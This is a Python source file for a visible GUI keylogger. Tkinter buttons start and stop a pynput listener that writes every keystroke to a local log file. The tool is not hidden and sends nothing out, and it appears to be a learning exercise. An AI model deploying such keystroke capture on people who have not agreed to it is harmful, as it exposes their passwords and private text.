import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading

log_file = "log.txt"
listener = None  # Global listener variable

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error writing to log: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        stop_keylogger()
        return False

def start_keylogger():
    global listener
    if listener is None or not listener.running:
        status_label.config(text="Keylogger is running... Press Esc to stop.")
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        threading.Thread(target=listener.start, daemon=True).start()
    else:
        messagebox.showinfo("Info", "Keylogger is already running!")

def stop_keylogger():
    global listener
    if listener and listener.running:
        listener.stop()
        status_label.config(text="Keylogger stopped.")
        listener = None
    else:
        messagebox.showinfo("Info", "Keylogger is not running!")

# ---------------- GUI ----------------
root = tk.Tk()
root.title("Keylogger GUI")
root.geometry("300x200")
root.resizable(False, False)

title_label = tk.Label(root, text="Simple Keylogger", font=("Helvetica", 16, "bold"))
title_label.pack(pady=10)

start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger, bg="#4CAF50", fg="white", width=20)
start_button.pack(pady=5)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, bg="#f44336", fg="white", width=20)
stop_button.pack(pady=5)

status_label = tk.Label(root, text="Status: Not running", fg="blue")
status_label.pack(pady=20)

root.mainloop()